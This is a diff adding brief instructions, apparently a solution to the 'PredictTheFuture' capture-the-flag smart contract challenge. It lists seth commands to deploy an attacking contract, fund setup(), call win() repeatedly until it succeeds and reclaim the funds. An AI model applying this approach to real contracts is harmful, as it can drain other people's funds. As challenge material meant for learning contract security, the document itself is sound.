@@ -1,0 +1,9 @@
+# See the smart contract PredictTheFuture
+
+# Deploy the contract and call setup()
+> seth send <myContractAddress> "setup()()" --value <1 ether in wei>
+
+# Call win() until it doesn't revert
+> seth send <myContractAddress> "win()()"
+
+# Make sure to claim funds back
